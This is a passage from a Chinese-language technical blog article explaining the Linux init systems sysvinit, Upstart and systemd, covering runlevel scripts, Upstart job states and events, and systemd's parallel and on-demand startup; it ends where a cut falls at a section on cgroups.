不需要启动X系统。用户只需要指定需要进入哪中模式，sysvinit将负责执行所有该模式所必须的初始化工作。</p><h2 id="sysvinit运行顺序"><a href="#sysvinit运行顺序" class="headerlink" title="sysvinit运行顺序"></a><strong>sysvinit运行顺序</strong></h2><p>Sysvinit 巧妙的用脚本，文件命名规则和软连接来实现不同的runlevel。首先，sysvinit需要读取&#x2F;etc&#x2F;inittab文件。分析这个文件的内容，它获得一下一些配置信息：</p><ul><li>系统需要进入的runlevel</li><li>捕获组合键的定义</li><li>定义电源 fail&#x2F;restore脚本</li><li>启动getty和虚拟控制台</li></ul><p>得到配置信息后，sysvinit顺序执行一下这些步骤，从而将系统初始化为预定的runlevel X。</p><ul><li>&#x2F;etc&#x2F;rc.d&#x2F;rc.sysinit</li><li>&#x2F;etc&#x2F;rc.d&#x2F;rc和&#x2F;etc&#x2F;rc.d&#x2F;rcX.d (X 代表运行级别0-6)</li><li>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</li><li>X Display Manger(如果需要的话)</li></ul><p>首先，运行rc.sysinit 以便执行一些重要的系统初始任务。在RedHat公司的RHEL5中(RHEL6 已经开始使用upstart了)，rc.sysinit主要完成一下这些工作。</p><ul><li>激活udev和selinux</li><li>设置定义在&#x2F;etc&#x2F;sysctl.conf中的内核参数</li><li>设置系统时钟</li><li>加载keymaps</li><li>使能交换分区</li><li>设置主机名(hostname)</li><li>根分区检查和remount</li><li>激活RAID和LVM设备</li><li>开启磁盘配额</li><li>检查并挂载所有文件系统</li><li>清楚过期的locks和PID文件</li></ul><p>完成以上这些工作之后，sysvinit开始运行&#x2F;etc&#x2F;rc.d&#x2F;rc脚本。根据不同的runlevel，rc脚本将打开对应该runlevel的rcX.d目录(X 就是runlevel),找到并运行存放在该目录下的所有启动脚本。每个runlevel X都有一个这样的目录，目录名为&#x2F;etc&#x2F;rc.d&#x2F;rcX.d。</p><p>这些目录下存放着很多不同的脚本。文件名以S开头的脚本就是启动时应该运行的脚本，S后面跟的数字定义了这些脚本的执行顺序。在&#x2F;etc&#x2F;rc.d&#x2F;rcX.d 目录下的脚本其实就是一些软链接文件，真实的脚本文件存放在&#x2F;etc&#x2F;init.d目录下。如下所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@li1556-65 rc.d]<span class="hljs-comment"># ls</span><br>init.d  rc  rc0.d  rc1.d  rc2.d  rc3.d  rc4.d  rc5.d  rc6.d  rc.local  rc.sysinit<br>[root@li1556-65 rc.d]<span class="hljs-comment"># cd rc3.d/</span><br>[root@li1556-65 rc3.d]<span class="hljs-comment"># ls</span><br>K10saslauthd   K75ntpdate      K89rdisc     S08ip6tables  S11auditd   S25netfs      S55sshd  S80sendmail  S99local<br>K50netconsole  K87restorecond  K92iptables  S10network    S12rsyslog  S26udev-post  S58ntpd  S90crond<br>[root@li1556-65 rc3.d]<span class="hljs-comment"># ll</span><br>total 0<br>lrwxrwxrwx 1 root root 19 Mar  9  2014 K10saslauthd -&gt; ../init.d/saslauthd<br>lrwxrwxrwx 1 root root 20 Mar  9  2014 K50netconsole -&gt; ../init.d/netconsole<br>lrwxrwxrwx 1 root root 17 Apr 14  2017 K75ntpdate -&gt; ../init.d/ntpdate<br>lrwxrwxrwx 1 root root 21 Mar  9  2014 K87restorecond -&gt; ../init.d/restorecond<br>lrwxrwxrwx 1 root root 15 Mar  9  2014 K89rdisc -&gt; ../init.d/rdisc<br>lrwxrwxrwx 1 root root 18 Dec  9  2016 K92iptables -&gt; ../init.d/iptables<br>lrwxrwxrwx 1 root root 19 Mar  9  2014 S08ip6tables -&gt; ../init.d/ip6tables<br>lrwxrwxrwx 1 root root 17 Mar  9  2014 S10network -&gt; ../init.d/network<br>lrwxrwxrwx 1 root root 16 Mar  9  2014 S11auditd -&gt; ../init.d/auditd<br>lrwxrwxrwx 1 root root 17 Mar  9  2014 S12rsyslog -&gt; ../init.d/rsyslog<br>lrwxrwxrwx 1 root root 15 Mar  9  2014 S25netfs -&gt; ../init.d/netfs<br>lrwxrwxrwx 1 root root 19 Mar  9  2014 S26udev-post -&gt; ../init.d/udev-post<br>lrwxrwxrwx 1 root root 14 Mar  9  2014 S55sshd -&gt; ../init.d/sshd<br>lrwxrwxrwx 1 root root 14 Apr 14  2017 S58ntpd -&gt; ../init.d/ntpd<br>lrwxrwxrwx 1 root root 18 Apr 14  2017 S80sendmail -&gt; ../init.d/sendmail<br>lrwxrwxrwx 1 root root 15 Mar  9  2014 S90crond -&gt; ../init.d/crond<br>lrwxrwxrwx 1 root root 11 Mar  9  2014 S99local -&gt; ../rc.local<br></code></pre></td></tr></table></figure><p>当所有的初始化脚本执行完毕，Sysvinit运行&#x2F;etc&#x2F;rc.d&#x2F;rc.local脚本。</p><p>rc.local是Linux留给用户进行个性化设置的地方。您可以把你自己想设置和启动的东西放到这里来，一台Linux server的用户一般不止一个，所以才有这样的考虑。</p><h2 id="Sysvinit-和系统关闭"><a href="#Sysvinit-和系统关闭" class="headerlink" title="Sysvinit 和系统关闭"></a><strong>Sysvinit 和系统关闭</strong></h2><p>Sysvinit 不仅需要负载初始化系统，还需要负责关闭系统，在系统关闭时，为了保证数据的一致性，需要小心地按照顺序进行结束和清理工作。</p><p>比如应该先停止对文件系统有读写操作的服务，然后再umonut文件系统，否则数据就会丢失。</p><p>这种顺序的控制也是依靠&#x2F;etc&#x2F;rc.d&#x2F;rcX.d&#x2F;目录下所有脚本的命名规则来控制的，在该目录下所有以K开头的脚本都将在关闭系统时调用，字母K之后的数字定义了它们的执行顺序。</p><p>这些脚本负责安全地停止服务或者其它的关闭工作。</p><h2 id="Sysvinit-的管理和控制功能"><a href="#Sysvinit-的管理和控制功能" class="headerlink" title="Sysvinit 的管理和控制功能"></a><strong>Sysvinit 的管理和控制功能</strong></h2><p>此外，在系统启动之后，管理员还需要对已经启动的进程进行管理和控制。原始的sysvinit软件包含了一系列的控制启动，运行和关闭所有其它程序的工具。</p><blockquote><ul><li>halt:<ul><li>停止系统</li></ul></li><li>init<ul><li>这个就是sysvinit本身的init进程实体，以PID1身份运行，是所有用户进程的父进程。最主要的作用是在启动过程中使用&#x2F;etc&#x2F;inittab文件创建进程。</li></ul></li><li>killall5<ul><li>就是 SystemV 的killall 命令，向除自己的会话(session)进程之外的其它进程发出信号，所以不能杀死当前使用的shell</li></ul></li><li>last<ul><li>回溯&#x2F;var&#x2F;log&#x2F;wtmp 文件（或者-f 选项指定的文件），显示自从这个文件建立以来，所有用户的登录情况。</li></ul></li><li>lastb<ul><li>作用和last差不多，默认情况下使用&#x2F;var&#x2F;log&#x2F;btmp文件，显示所有失败登录企图。</li></ul></li><li>mesg<ul><li>控制其它用户对用户终端的访问</li></ul></li><li>pidof<ul><li>找出程序的进程识别号(pid)，输出到标准输出设备</li></ul></li><li>poweroff<ul><li>等于shutdown -h -p ,或者telinit 0.关闭系统并切断电源</li></ul></li><li>reboot<ul><li>等于shutdown -r 或者 telinit 6。重启系统。</li></ul></li><li>runlevel<ul><li>读取系统的登录文件（一般是&#x2F;var&#x2F;run&#x2F;utmp）把以前和当前的系统运行级输出到标准输出设备。</li></ul></li><li>shutdown<ul><li>以一种安全的方式终止系统，所有正在登录的用户都会收到系统将要终止通知，并且不准新的登录</li></ul></li><li>sulogin<ul><li>当系统进入单用户模式时，被init调用。当接收到启动加载程序传递的-b选项时，init也会调用sulogin。</li></ul></li><li>telinit<ul><li>实际是init的一个连接，用来向init传递单字符参数和信号</li></ul></li><li>utmpdump<ul><li>以一种用户友好的格式想标准输出设备显示&#x2F;var&#x2F;run&#x2F;utmp文件的内容。</li></ul></li><li>wall<ul><li>向所有有信息权限的登录用户发送消息</li></ul></li></ul></blockquote><p>不同的Linux发行版在这些sysvinit的基本工具基础上又开发了一些辅助工具用来简化init系统的管理工作。比如RedHat的RHEL在sysvinit的基础上开发了initscripts软件包，包含了大量的启动脚本（如：rc.sysinit），还提供了service,checonfig等命令行工具，甚至一套图形化界面来管理init系统。其它的Linux发行版也各有各自的initscripts或其他名字的init软件包来简化sysvinit管理。</p><p>只要您理解了sysvinit机制，在一个最简的仅有sysvinit的系统下，您也可以直接调用脚本启动和停止服务，手动创建inittab和创建软连接来完成这些任务，因此理解sysvinit的基本原理和命令是最重要的。您甚至可以开发一套自己的管理工具。</p><h2 id="Sysvinit的小结"><a href="#Sysvinit的小结" class="headerlink" title="Sysvinit的小结"></a><strong>Sysvinit的小结</strong></h2><p>Sysvinit 的优点是概念简单。Service 开发人员只需要编写启动和停止脚本，概念非常清楚；将 service 添加&#x2F;删除到某个 runlevel 时，只需要执行一些创建&#x2F;删除软连接文件的基本操作；这些都不需要学习额外的知识或特殊的定义语法(UpStart 和 Systemd 都需要用户学习新的定义系统初始化行为的语言)。</p><p>其次，sysvinit 的另一个重要优点是确定的执行顺序：脚本严格按照启动数字的大小顺序执行，一个执行完毕再执行下一个，这非常有益于错误排查。UpStart 和 systemd 支持并发启动，导致没有人可以确定地了解具体的启动顺序，排错不易。</p><p>但是串行地执行脚本导致 sysvinit 运行效率较慢，在新的 IT 环境下，启动快慢成为一个重要问题。此外动态设备加载等 Linux 新特性也暴露出 sysvinit 设计的一些问题。针对这些问题，人们开始想办法改进 sysvinit，以便加快启动时间，并解决 sysvinit 自身的设计问题。</p><p>Upstart 是第一个被广泛应用的新一代 init 系统。我们在接下来的第二部分介绍 UpStart。</p><h1 id="UpStart"><a href="#UpStart" class="headerlink" title="UpStart"></a>UpStart</h1><p>假如您使用的 Linux 发行版是 Ubuntu，很可能会发现在您的计算机上找不到&#x2F;etc&#x2F;inittab 文件了，这是因为 Ubuntu 使用了一种被称为 upstart 的新型 init 系统。</p><p>Upstart 是第一个被广泛应用的新一代 init 系统。</p><h2 id="开发Upstart的缘由"><a href="#开发Upstart的缘由" class="headerlink" title="开发Upstart的缘由"></a>开发Upstart的缘由</h2><p>大约在 2006 年或者更早的时候， Ubuntu 开发人员试图将 Linux 安装在笔记本电脑上。在这期间技术人员发现经典的 sysvinit 存在一些问题：它不适合笔记本环境。这促使程序员 Scott James Remnant 着手开发 upstart。</p><p>当 Linux 内核进入 2.6 时代时，内核功能有了很多新的更新。新特性使得 Linux 不仅是一款优秀的服务器操作系统，也可以被用于桌面系统，甚至嵌入式设备。桌面系统或便携式设备的一个特点是经常重启，而且要频繁地使用硬件热插拔技术。在现代计算机系统中，硬件繁多、接口有限，人们并非将所有设备都始终连接在计算机上，比如 U 盘平时并不连接电脑，使用时才插入 USB 插口。因此，当系统上电启动时，一些外设可能并没有连接。而是在启动后当需要的时候才连接这些设备。在 2.6 内核支持下，一旦新外设连接到系统，内核便可以自动实时地发现它们，并初始化这些设备，进而使用它们。这为便携式设备用户提供了很大的灵活性。</p><p>可是这些特性为 sysvinit 带来了一些挑战。当系统初始化时，需要被初始化的设备并没有连接到系统上；比如打印机。为了管理打印任务，系统需要启动 CUPS 等服务，而如果打印机没有接入系统的情况下，启动这些服务就是一种浪费。Sysvinit 没有办法处理这类需求，它必须一次性把所有可能用到的服务都启动起来，即使打印机并没有连接到系统，CUPS 服务也必须启动。</p><p>还有网络共享盘的挂载问题。在&#x2F;etc&#x2F;fstab 中，可以指定系统自动挂载一个网络盘，比如 NFS，或者 iSCSI 设备。在本文的第一部分 sysvinit 的简介中可以看到，sysvinit 分析&#x2F;etc&#x2F;fstab 挂载文件系统这个步骤是在网络启动之前。可是如果网络没有启动，NFS 或者 iSCSI 都不可访问，当然也无法进行挂载操作。Sysvinit 采用 netdev 的方式来解决这个问题，即&#x2F;etc&#x2F;fstab 发现 netdev 属性挂载点的时候，不尝试挂载它，在网络初始化并使能之后，还有一个专门的 netfs 服务来挂载所有这些网络盘。这是一个不得已的补救方法，给管理员带来不便。部分新手管理员甚至从来也没有听说过 netdev 选项，因此经常成为系统管理的一个陷阱。</p><p>针对以上种种情况，Ubuntu 开发人员在评估了当时的几个可选 init 系统之后，决定重新设计和开发一个全新的 init 系统，即 UpStart。UpStart 基于事件机制，比如 U 盘插入 USB 接口后，udev 得到内核通知，发现该设备，这就是一个新的事件。UpStart 在感知到该事件之后触发相应的等待任务，比如处理&#x2F;etc&#x2F;fstab 中存在的挂载点。采用这种事件驱动的模式，upstart 完美地解决了即插即用设备带来的新问题。</p><p>此外，采用事件驱动机制也带来了一些其它有益的变化，比如加快了系统启动时间。sysvinit 运行时是同步阻塞的。一个脚本运行的时候，后续脚本必须等待。这意味着所有的初始化步骤都是串行执行的，而实际上很多服务彼此并不相关，完全可以并行启动，从而减小系统的启动时间。在 Linux 大量应用于服务器的时代，系统启动时间也许还不那么重要；然而对于桌面系统和便携式设备，启动时间的长短对用户体验影响很大。此外云计算等新的 Server 端技术也往往需要单个设备可以更加快速地启动。</p><p>UpStart 满足了这些需求，目前不仅桌面系统 Ubuntu 采用了 UpStart，甚至企业级服务器级的 RHEL 也默认采用 UpStart 来替换 sysvinit 作为 init 系统。</p><h2 id="Upstart的特点"><a href="#Upstart的特点" class="headerlink" title="Upstart的特点"></a>Upstart的特点</h2><p>UpStart解决了之前提到的sysvinit的缺点。采用时间驱动模型，UpStart可以：</p><ul><li>更快地启动系统</li><li>当新硬件被发现时动态启动服务</li><li>硬件被拔出时动态停止服务</li></ul><p>这些特点使得 UpStart 可以很好地应用在桌面或者便携式系统中，处理这些系统中的动态硬件插拔特性。</p><h2 id="Upstart概念和术语"><a href="#Upstart概念和术语" class="headerlink" title="Upstart概念和术语"></a>Upstart概念和术语</h2><p>Upstart 的基本概念和设计清晰明确。UpStart 主要的概念是 job 和 event。Job 就是一个工作单元，用来完成一件工作，比如启动一个后台服务，或者运行一个配置命令。每个 Job 都等待一个或多个事件，一旦事件发生，upstart 就触发该 job 完成相应的工作。</p><h3 id="Job"><a href="#Job" class="headerlink" title="Job"></a><strong>Job</strong></h3><p>Job 就是一个工作的单元，一个任务或者一个服务。可以理解为 sysvinit 中的一个服务脚本。有三种类型的工作：</p><ul><li>task job;</li><li>service job;</li><li>abstract job;</li></ul><p>task job 代表在一定时间内会执行完毕的任务，比如删除一个文件；</p><p>service job 代表后台服务进程，比如 apache httpd。这里进程一般不会退出，一旦开始运行就成为一个后台精灵进程，由 init 进程管理，如果这类进程退出，由 init 进程重新启动，它们只能由 init 进程发送信号停止。它们的停止一般也是由于所依赖的停止事件而触发的，不过 upstart 也提供命令行工具，让管理人员手动停止某个服务；</p><p>Abstract job 仅由 upstart 内部使用，仅对理解 upstart 内部机理有所帮助。我们不用关心它。</p><p>除了以上的分类之外，还有另一种工作（Job）分类方法。Upstart 不仅可以用来为整个系统的初始化服务，也可以为每个用户会话（session）的初始化服务。系统的初始化任务就叫做 system job，比如挂载文件系统的任务就是一个 system job；用户会话的初始化服务就叫做 session job。</p><h3 id="Job生命周期"><a href="#Job生命周期" class="headerlink" title="Job生命周期"></a><strong>Job生命周期</strong></h3><p>Upstart 为每个工作都维护一个生命周期。一般来说，工作有开始，运行和结束这几种状态。为了更精细地描述工作的变化，Upstart 还引入了一些其它的状态。比如开始就有开始之前(pre-start)，即将开始(starting)和已经开始了(started)几种不同的状态，这样可以更加精确地描述工作的当前状态。</p><p>工作从某种初始状态开始，逐渐变化，或许要经历其它几种不同的状态，最终进入另外一种状态，形成一个状态机。在这个过程中，当工作的状态即将发生变化的时候，init 进程会发出相应的事件（event）。</p><p>Upstart中Job的可能状态</p><table><thead><tr><th>状态名</th><th>含义</th></tr></thead><tbody><tr><td>Waiting</td><td>初始状态</td></tr><tr><td>Starting</td><td>Job即将开始</td></tr><tr><td>pre-start</td><td>执行pre-start段，即任务开始前应该完成的工作</td></tr><tr><td>Spawned</td><td>准备执行script或者exec段</td></tr><tr><td>post-start</td><td>执行post-start动作</td></tr><tr><td>Running</td><td>interim state set after post-start section processed denoting job is running (But it may have no associated PID!)</td></tr><tr><td>pre-stop</td><td>执行pre-stop段</td></tr><tr><td>Stopping</td><td>interim state set after pre-stop section processed</td></tr><tr><td>Killed</td><td>任务即将被停止</td></tr><tr><td>post-stop</td><td>执行post-stop段</td></tr></tbody></table><p>展示了 Job 的状态机</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406092343582.png"></p><p>其中有四个状态会引起 init 进程发送相应的事件，表明该工作的相应变化：</p><ul><li>Starting</li><li>Started</li><li>Stopping</li><li>Stopped</li></ul><p><strong>事件 Event</strong></p><p>顾名思义，Event 就是一个事件。事件在 upstart 中以通知消息的形式具体存在。一旦某个事件发生了，Upstart 就向整个系统发送一个消息。没有任何手段阻止事件消息被 upstart 的其它部分知晓，也就是说，事件一旦发生，整个 upstart 系统中所有工作和其它的事件都会得到通知。</p><p>Event 可以分为三类: signal，methods 或者 hooks。</p><ul><li>Signals:<ul><li>Signal 事件是非阻塞的，异步的。发送一个信号之后控制权立即返回。</li></ul></li><li>Methods:<ul><li>Methods事件是阻塞的、同步的</li></ul></li><li>Hooks:<ul><li>Hooks 事件是阻塞的，同步的。它介于 Signals 和 Methods 之间，调用发出 Hooks 事件的进程必须等待事件完成才可以得到控制权，但不检查事件是否成功</li></ul></li></ul><p>事件是个非常抽象的概念，下面我罗列出一些常见的事件，希望可以帮助您进一步了解事件的含义：</p><ul><li>系统上电启动，init 进程会发送”start”事件</li><li>根文件系统可写时，相应 job 会发送文件系统就绪的事件</li><li>一个块设备被发现并初始化完成，发送相应的事件</li><li>某个文件系统被挂载，发送相应的事件</li><li>类似 atd 和 cron，可以在某个时间点，或者周期的时间点发送事件</li><li>另外一个 job 开始或结束时，发送相应的事件</li><li>一个磁盘文件被修改时，可以发出相应的事件</li><li>一个网络设备被发现时，可以发出相应的事件</li><li>缺省路由被添加或删除时，可以发出相应的事件</li></ul><p>不同的 Linux 发行版对 upstart 有不同的定制和实现，实现和支持的事件也有所不同，可以用<code>man 7 upstart-events</code>来查看事件列表。</p><p><strong>Upstart在机器启动时的执行过程</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406092343138.png"></p><p>在机器做完那些<a href="http://www.yunweipai.com/archives/782.html">加载内核，挂载跟目录等工作</a>后，操作系统会调用 &#x2F;sbin&#x2F;init 来接管后续的服务启动过程。</p><ul><li><p>init 启动后马上发出第一个事件 startup</p></li><li><p>hostname，mountall 会被 startup 事件触发（在 &#x2F;etc&#x2F;init 目录下 grep startup * 就可以看到了！)，也就是一启动就开始分别设置 hostname 和 挂载硬盘。</p><p>在 mountall.conf 里可以看到它主要运行了 <a href="http://manpages.ubuntu.com/manpages/vivid/man8/mountall.8.html">mountall</a> 程序，这个程序会读取 &#x2F;lib&#x2F;init&#x2F;fstab 和 &#x2F;etc&#x2F;fstab 里的配置，按顺序挂载。其中 &#x2F;lib&#x2F;init&#x2F;fstab 里的都是像 &#x2F;proc &#x2F;sys 这样的虚拟磁盘。</p><p>mountall 会发出很多可以触发 Upstart 的事件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">emits virtual-filesystems<br>emits local-filesystems<br>emits remote-filesystems<br>emits all-swaps<br>emits filesystem<br>emits mounting<br>emits mounted<br></code></pre></td></tr></table></figure><p>每挂载好一个磁盘都会发出一个 mounted 事件，当挂载完 &#x2F;lib&#x2F;init&#x2F;fstab 里的虚拟磁盘后会发出 virtual-filesystems 事件，mountall 继续处理 &#x2F;etc&#x2F;fstab 里的配置，期间会发出 remote-filesystems, all-swaps等事件，全部处理完后会发送 local-filesystems 和 filesystem 事件。</p><p>也就是说，当 Upstart 接收到 filesystem 事件时，配置文件中的磁盘已经挂载好了。</p><p>mountall 发出的很多事件，有些是以<a href="http://upstart.ubuntu.com/cookbook/#event-types">阻塞的方式</a>发出的，也就是在 mountall 过程中有些别的任务已经被触发并且可能已经完成了。</p></li><li><p>udev.conf 在接收到 virtual-filesystem 时出发，这是一个管理 &#x2F;dev 下的设备描述的程序。</p><ul><li>udev 导致 upstart-udev-bridge 任务执行，这个任务会设置好 127.0.0.0 这个网络回路地址。</li><li>udev 和 filesystem 事件还是开始网络设置的前提。</li></ul></li><li><p>在设置网络之前，ufw 的配置也会准备就绪。</p></li><li><p>网络和文件系统都准备好后出发 rc-sysinit.conf 里的脚本执行，里面其实就是打开 telinit 程序并传入一个2作为参数，这个程序发出 runlevel 事件。</p><ul><li>rc.conf 会被 runlevel 事件触发，它会调用 &#x2F;etc&#x2F;init.d&#x2F;rc 2 ， 这是兼容传统 init 的关键步骤。</li><li>其他 job 也会被 runlevel 事件触发，例如 cron、ssh、irqbalance 等。</li></ul></li></ul><h3 id="Upstart小结"><a href="#Upstart小结" class="headerlink" title="Upstart小结"></a><a href="https://cntsp.github.io/2019/12/16/%E6%B5%85%E6%9E%90Linux%E5%88%9D%E5%A7%8B%E5%8C%96init%E7%B3%BB%E7%BB%9F-UpStart/#Upstart%E5%B0%8F%E7%BB%93" title="Upstart小结"></a>Upstart小结</h3><p>可以看到，UpStart 的设计比 SysVInit 更加先进。多数 Linux 发行版上已经不再使用 SysVInit，一部分发行版采用了 UpStart，比如 Ubuntu；而另外一些比如 Fedora，采用了一种被称为 systemd 的 init 系统。Systemd 出现的比 UpStart 更晚，但发展迅速，虽然 UpStart 也还在积极开发并被越来越多地应用，但 systemd 似乎发展更快，我将在下一篇文章中再介绍 systemd。</p><h1 id="Systemd"><a href="#Systemd" class="headerlink" title="Systemd"></a>Systemd</h1><p>Systemd 是 Linux 系统中最新的初始化系统（init），它主要的设计目标是克服 sysvinit 固有的缺点，提高系统的启动速度。Ubuntu 系统原本使用的是 UpStart ，但是在后来 Ubuntu 还是使用了 Systemd 作为 init 系统。</p><p>Systemd 的很多概念来源于苹果 Mac OS 操作系统上的 launchd，不过 launchd 专用于苹果系统，因此长期未能获得应有的广泛关注。Systemd 借鉴了很多 launchd 的思想，它的重要特性如下：</p><p> <strong>在 Linux 系统中，<code>d</code> 的含义是守护进程的意思，所以 Systemd 这个名字的含义，就是它要守护整个系统。</strong></p><p>Systemd 的优点是功能强大，使用方便，缺点是体系庞大，非常复杂。事实上，现在还有很多人反对使用 Systemd，理由就是它过于复杂，与操作系统的其他部分强耦合，违反”keep simple, keep stupid”的 Unix 哲学。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406151550451.png"></p><p>上面是 Systmed 的架构图，可以看到实际上 Systemd 不是一个命令组成的，而是有一组命令组成的。</p><p><strong>实际上，Systemd 就是一个系统管家。帮助我们管理 Linux 系统中的各种资源，我们可以使用这个系统管家进行管理。在 Systemd 中每一个被管理的资源都被称为一个 Unit 。在 Systemd 中一共有 12 中 Unit 类型，包括如下：</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">-</span> Service unit：系统服务<br><span class="hljs-bullet">-</span> Target unit：多个 Unit 构成的一个组<br><span class="hljs-bullet">-</span> Device Unit：硬件设备<br><span class="hljs-bullet">-</span> Mount Unit：文件系统的挂载点<br><span class="hljs-bullet">-</span> Automount Unit：自动挂载点<br><span class="hljs-bullet">-</span> Path Unit：文件或路径<br><span class="hljs-bullet">-</span> Scope Unit：不是由 Systemd 启动的外部进程<br><span class="hljs-bullet">-</span> Slice Unit：进程组<br><span class="hljs-bullet">-</span> Snapshot Unit：Systemd 快照，可以切回某个快照<br><span class="hljs-bullet">-</span> Socket Unit：进程间通信的 socket<br><span class="hljs-bullet">-</span> Swap Unit：swap 文件<br><span class="hljs-bullet">-</span> Timer Unit：定时器<br></code></pre></td></tr></table></figure><h2 id="同-SysVinit-和-LSB-init-scripts-兼容"><a href="#同-SysVinit-和-LSB-init-scripts-兼容" class="headerlink" title="同 SysVinit 和 LSB init scripts 兼容"></a>同 SysVinit 和 LSB init scripts 兼容</h2><p>Systemd 是一个”新来的”，Linux 上的很多应用程序并没有来得及为它做相应的改变。和 UpStart 一样，systemd 引入了新的配置方式，对应用程序的开发也有一些新的要求。如果 systemd 想替代目前正在运行的初始化系统，就必须和现有程序兼容。任何一个 Linux 发行版都很难为了采用 systemd 而在短时间内将所有的服务代码都修改一遍。</p><p>Systemd 提供了和 Sysvinit 以及 LSB initscripts 兼容的特性。系统中已经存在的服务和进程无需修改。这降低了系统向 systemd 迁移的成本，使得 systemd 替换现有初始化系统成为可能。</p><h2 id="更快的启动速度"><a href="#更快的启动速度" class="headerlink" title="更快的启动速度"></a>更快的启动速度</h2><p>Systemd 提供了比 UpStart 更激进的并行启动能力，采用了 socket &#x2F; D-Bus activation 等技术启动服务。一个显而易见的结果就是：更快的启动速度。</p><p>为了减少系统启动时间，systemd 的目标是：</p><ul><li>尽可能启动更少的进程</li><li>尽可能将更多进程并行启动</li></ul><p>同样地，UpStart 也试图实现这两个目标。UpStart 采用事件驱动机制，服务可以暂不启动，当需要的时候才通过事件触发其启动，这符合第一个设计目标；此外，不相干的服务可以并行启动，这也实现了第二个目标。</p><p>下面的图形演示了 UpStart 相对于 SysVInit 在并发启动这个方面的改进：</p><h3 id="图-1-UpStart-对-SysVinit-的改进"><a href="#图-1-UpStart-对-SysVinit-的改进" class="headerlink" title="图 1. UpStart 对 SysVinit 的改进"></a>图 1. UpStart 对 SysVinit 的改进</h3><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406092346047.png"></p><p>假设有 7 个不同的启动项目， 比如 JobA、Job B 等等。在 SysVInit 中，每一个启动项目都由一个独立的脚本负责，它们由 sysVinit 顺序地，串行地调用。因此总的启动时间为 T1+T2+T3+T4+T5+T6+T7。其中一些任务有依赖关系，比如 A,B,C,D。</p><p>而 Job E 和 F 却和 A,B,C,D 无关。这种情况下，UpStart 能够并发地运行任务{E，F，(A,B,C,D)}，使得总的启动时间减少为 T1+T2+T3。</p><p>这无疑增加了系统启动的并行性，从而提高了系统启动速度。但是在 UpStart 中，有依赖关系的服务还是必须先后启动。比如任务 A,B,(C,D)因为存在依赖关系，所以在这个局部，还是串行执行。</p><p>让我们例举一些例子， Avahi 服务需要 D-Bus 提供的功能，因此 Avahi 的启动依赖于 D-Bus，UpStart 中，Avahi 必须等到 D-Bus 启动就绪之后才开始启动。类似的，livirtd 和 X11 都需要 HAL 服务先启动，而所有这些服务都需要 syslog 服务记录日志，因此它们都必须等待 syslog 服务先启动起来。然而 httpd 和他们都没有关系，因此 httpd 可以和 Avahi 等服务并发启动。</p><p>Systemd 能够更进一步提高并发性，即便对于那些 UpStart 认为存在相互依赖而必须串行的服务，比如 Avahi 和 D-Bus 也可以并发启动。从而实现如下图所示的并发启动过程：</p><h3 id="图-2-systemd-的并发启动"><a href="#图-2-systemd-的并发启动" class="headerlink" title="图 2. systemd 的并发启动"></a>图 2. systemd 的并发启动</h3><p><img src="https://cntsp.github.io/medias/contents/81.png"></p><p>所有的任务都同时并发执行，总的启动时间被进一步降低为 T1。</p><p>可见 systemd 比 UpStart 更进一步提高了并行启动能力，极大地加速了系统启动时间。</p><h2 id="systemd-提供按需启动能力"><a href="#systemd-提供按需启动能力" class="headerlink" title="systemd 提供按需启动能力"></a>systemd 提供按需启动能力</h2><p>当 sysvinit 系统初始化的时候，它会将所有可能用到的后台服务进程全部启动运行。并且系统必须等待所有的服务都启动就绪之后，才允许用户登录。这种做法有两个缺点：首先是启动时间过长；其次是系统资源浪费。</p><p>某些服务很可能在很长一段时间内，甚至整个服务器运行期间都没有被使用过。比如 CUPS，打印服务在多数服务器上很少被真正使用到。您可能没有想到，在很多服务器上 SSHD 也是很少被真正访问到的。花费在启动这些服务上的时间是不必要的；同样，花费在这些服务上的系统资源也是一种浪费。</p><p>Systemd 可以提供按需启动的能力，只有在某个服务被真正请求的时候才启动它。当该服务结束，systemd 可以关闭它，等待下次需要时再次启动它。</p><p>所以在很多时候我可以是使用 <code>Systemd</code> 来代替很多其他的命令。比如说可以替换的用来实现定时命令的 <code>at</code> 、<code>cron</code> 命令等等。</p><h2 id="Systemd-采用-Linux-的-Cgroup-特性跟踪和管理进程的生命周期"><a href="#Systemd-采用-Linux-的-Cgroup-特性跟踪和管理进程的生命周期" class="headerlink" title="Systemd 采用 Linux 的 Cgroup 特性跟踪和管理进程的生命周期"></a>Systemd 采用 Linux 的 Cgroup 特性跟踪和管理进程的生命周期</h2><p>init 系统的一个重要职责就是负责跟踪和管理服务进程的生命周期。它不仅可以启动一个服务，也必须也能够停止服务。这看上去没有什么特别的，然而在真正用代码实现的时候，您或许会发现停止服务比一开始想的要困难。</p><p>服务进程一般都会作为精灵进程（daemon）在后台运行，为此服务程序有时候会派生(fork)两次。在 UpStart 中，需要在配置文件中正确地配置 expect 小节。这样 UpStart 通过对 fork 系统调用进行计数，从而获知真正的精灵进程的 PID 号。比如图 3 所示的例子：</p><h3 id="图-3-找到正确-pid"><a href="#图-3-找到正确-pid" 